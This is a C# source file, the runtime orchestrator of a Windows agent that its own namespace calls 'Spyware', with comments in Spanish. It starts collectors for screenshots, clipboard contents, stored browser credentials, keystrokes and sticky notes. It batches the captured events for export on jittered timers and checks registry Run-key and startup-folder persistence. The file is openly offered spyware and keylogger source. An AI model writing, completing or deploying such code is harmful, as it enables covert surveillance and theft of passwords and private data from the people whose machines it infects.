using System.Reflection;
using Spyware.Collectors.Browsers;
using Spyware.Collectors.Clipboard;
using Spyware.Collectors.Keyboard;
using Spyware.Collectors.Notes;
using Spyware.Collectors.Screenshot;
using Spyware.Core.Configuration;
using Spyware.Core.Contracts;
using Spyware.Core.Logging;
using Spyware.Core.Paths;
using Spyware.Core.Runtime;
using Spyware.Core.Scheduling;
using Spyware.Maintenance;
using Spyware.Persistence;
using Spyware.Storage;
using Spyware.Transport;

namespace Spyware.Agent;

/// <summary>Orquesta ciclo de vida, collectors, transporte local y mantenimiento.</summary>
internal sealed class AgentRuntime : IDisposable
{
    private readonly AgentPaths _paths;
    private readonly AgentConfig _config;
    private readonly ILog _log;
    private readonly LocalEventRepository _repository;
    private readonly SpoolManager _spool;
    private readonly RetentionPolicy _retention;
    private readonly ScreenCaptureService _screenshots;
    private readonly ClipboardMonitor _clipboard;
    private readonly BrowserCredentialProvider _browsers;
    private readonly KeyCaptureService _keyboard;
    private readonly StickyNotesProvider _notes;
    private readonly EventBatcher _batcher;
    private readonly IReadOnlyList<IEventExporter> _exporters;

    private PeriodicTask? _transportTask;
    private PeriodicTask? _retentionTask;
    private PeriodicTask? _healthTask;
    private string? _lastError;
    private bool _started;

    public AgentRuntime(AgentPaths paths, AgentConfig config, ILog log)
    {
        _paths = paths;
        _config = config;
        _log = log;

        _repository = new LocalEventRepository(paths.StorageDb, log);
        _repository.Initialize();

        _spool = new SpoolManager(paths, log);
        _retention = new RetentionPolicy(paths, _repository, _spool, config.Storage, log);
        _screenshots = new ScreenCaptureService(paths, _repository, _spool, config.Screenshot, log);
        _clipboard = new ClipboardMonitor(paths, _repository, _spool, config.Clipboard, log);
        _browsers = new BrowserCredentialProvider(paths, _repository, _spool, config.Browsers, log);

        // El teclado reutiliza el servicio de captura: la captura por cambio de foco pasa
        // por el mismo hash anti-duplicado y el mismo spool, sin crear una segunda ventana.
        _keyboard = new KeyCaptureService(paths, _repository, _spool, config.Keyboard, log,
            focusCapture: () => _screenshots.CaptureOnce());
        _notes = new StickyNotesProvider(paths, _repository, _spool, config.Notes, log);
        _exporters = TransportFactory.Create(paths, config, log);
        _batcher = new EventBatcher(config.AgentId, _repository, _exporters, config.Transport, log);
    }

    public void Start()
    {
        if (_started) return;

        _started = true;

        _log.Info($"Agente {_config.AgentName} [{_config.AgentId}] iniciado en {_paths.RootDirectory}");
        _log.Info($"Contexto: {ProcessContext.DomainName}\\{ProcessContext.UserName}, token {ProcessContext.DescribeToken()}, sesión {ProcessContext.SessionId}.");

        try
        {
            _repository.SetMeta("agent_id", _config.AgentId);
            _repository.SetMeta("first_run_utc", DateTime.UtcNow.ToString("o"));
            _repository.SetMeta("encrypted_at_rest", _config.Storage.EncryptLocalData ? "true" : "false");

            _screenshots.Start();
            _clipboard.Start();
            _browsers.Start();
            _keyboard.Start();
            _notes.Start();

            if (_config.Transport.Enabled)
            {
                _transportTask = new PeriodicTask(
                    "transport",
                    () => _batcher.Flush(),
                    TimeSpan.FromSeconds(Math.Max(5, _config.Transport.FlushIntervalSeconds)),
                    jitterSeconds: Math.Max(1, _config.Transport.FlushIntervalSeconds / 5),
                    _log);

                _transportTask.Start(runImmediately: false);
            }

            _retentionTask = new PeriodicTask(
                "retention",
                () =>
                {
                    _retention.Apply();
                    _batcher.Flush();
                },
                TimeSpan.FromMinutes(Math.Max(5, _config.Storage.PruneIntervalMinutes)),
                jitterSeconds: 30,
                _log);

            _retentionTask.Start(runImmediately: true);

            _healthTask = new PeriodicTask("health", WriteHealth, TimeSpan.FromSeconds(60), 5, _log);
            _healthTask.Start(runImmediately: true);

            WritePersistenceState();
        }
        catch (Exception ex)
        {
            _lastError = ex.Message;
            _log.Error("El arranque parcial del agente falló; los módulos restantes siguen intentando.", ex);
        }
    }

    public void Stop(string reason)
    {
        if (!_started) return;

        _started = false;
        _log.Info($"Deteniendo el agente ({reason}).");

        try
        {
            _healthTask?.Stop();
            _retentionTask?.Stop();
            _transportTask?.Stop();
            _screenshots.Stop();
            _clipboard.Stop();
            _browsers.Stop();
            _notes.Stop();

            // El teclado va el último: su parada cierra la ráfaga pendiente y vacía la cola.
            _keyboard.Stop();

            try { _batcher.Flush(); }
            catch (Exception ex) { _log.Warn("El flush final falló: " + ex.Message); }

            WriteHealth();
        }
        finally
        {
            _log.Info("Coletores detenidos.");
        }
    }

    private void WritePersistenceState()
    {
        var registry = new RegistryRunInstaller();
        string valueName = _config.Persistence.RegistryValueName;
        bool installed = registry.IsInstalled(valueName, ProcessContext.ExecutablePath);

        if (!installed && _config.Persistence.Enabled)
            _log.Warn("La Run key no coincide con este ejecutable; ejecutar SpywareAgent.exe --install.");
    }

    private void WriteHealth()
    {
        HealthCheck.Write(_paths, BuildSnapshot(), _log);
    }

    public HealthSnapshot BuildSnapshot()
    {
        var registry = new RegistryRunInstaller();
        var startup = new StartupFolderInstaller();
        string valueName = _config.Persistence.RegistryValueName;

        string persistence =
            registry.IsInstalled(valueName, ProcessContext.ExecutablePath) ? "registry-run"
            : startup.IsInstalled(valueName) ? "startup-folder"
            : "none";

        var collectors = new Dictionary<string, bool>
        {
            ["screenshot"] = _config.Screenshot.Enabled,
            ["clipboard"] = _config.Clipboard.Enabled,
            ["browsers"] = _config.Browsers.Enabled,
            ["keyboard"] = _config.Keyboard.Enabled,
            ["notes"] = _config.Notes.Enabled,
            ["transport"] = _config.Transport.Enabled
        };

        string version = Assembly.GetExecutingAssembly().GetName().Version?.ToString() ?? "1.0.0";

        return new HealthSnapshot
        {
            AgentId = _config.AgentId,
            ProcessId = ProcessContext.ProcessId,
            AgentVersion = version,
            MachineName = ProcessContext.MachineName,
            UserName = ProcessContext.UserName,
            SessionId = ProcessContext.SessionId,
            Token = ProcessContext.DescribeToken(),
            Persistence = persistence,
            Collectors = collectors,
            Storage = _repository.GetStats(),
            StorageBytes = _spool.GetManagedStorageBytes(),
            PendingEvents = _repository.CountUnsent(),
            LastError = _lastError
        };
    }

    public IReadOnlyDictionary<string, int> StorageStats() => _repository.GetStats();

    public void Dispose()
    {
        Stop("dispose");

        _healthTask?.Dispose();
        _retentionTask?.Dispose();
        _transportTask?.Dispose();
        _batcher.Dispose();
        _repository.Dispose();
    }
}
